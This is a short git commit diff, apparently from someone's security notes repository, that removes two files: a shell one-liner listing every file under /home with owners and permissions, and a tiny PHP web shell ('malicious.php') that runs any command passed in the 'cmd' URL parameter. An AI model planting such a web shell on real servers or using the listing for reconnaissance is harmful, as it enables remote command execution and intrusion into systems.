2576a5bbd7044521640f336c965cc3ea81b09c6b
root <root@localhost.localdomain>
2019-09-17 00:23:09 -0700

    move note out of repo

--- AnPham/Notes/Web/get-file-dir.sh
+++
@@ -1,1 +0,0 @@
-find /home -printf "%f\t%p\t%u\t%g\t%m" 2> /dev/null | column -t
--- AnPham/Notes/Web/malicious.php
+++
@@ -1,5 +0,0 @@
-<?php
- // Rudimentary Shell
- // People should request: site/malicious.php?
-  passthru($_GET['cmd']);
-?>
